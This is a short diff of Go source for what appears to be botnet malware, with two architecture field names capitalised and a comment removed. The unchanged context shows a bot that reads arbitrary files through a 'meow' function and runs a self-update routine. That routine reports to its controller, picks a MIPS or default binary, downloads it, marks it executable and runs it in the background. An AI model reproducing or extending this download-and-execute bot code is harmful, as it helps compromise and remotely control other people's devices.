@@ -69,9 +69,6 @@ func (b Bot) setInfoPort(port string) string {
 	return "CLOSE"
 }
 
-/*
-	This is fun lol.
-*/
 func meow(location string) string {
 	return execComd("cat", location)
 }
@@ -95,9 +92,9 @@ func (b *Bot) Update() {
 		b.Report("START UPDATING...")
 		archChecker := execComd("tail", "-1", "/var/tmp/"+fileName(true))
 		if Find(archChecker, "[mips]") {
-			pullWeb(fileName(false), setCall.CallBot.mipsArch)
+			pullWeb(fileName(false), setCall.CallBot.MipsArch)
 		} else {
-			pullWeb(fileName(false), setCall.CallBot.defaultArch)
+			pullWeb(fileName(false), setCall.CallBot.DefaultArch)
 		}
 		execComd("chmod", "700", fileName(false))
 		go execComd("./"+fileName(false), "&")
